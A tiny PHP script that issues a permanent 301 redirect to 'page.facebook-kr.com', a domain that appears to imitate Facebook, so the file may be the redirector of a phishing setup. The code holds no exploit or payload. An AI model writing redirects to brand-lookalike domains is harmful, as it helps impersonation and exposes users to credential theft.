<?php

$newURL = "https://page.facebook-kr.com/";


header("HTTP/1.1 301 Moved Permanently");
header("Location: $newURL");
exit();
?>
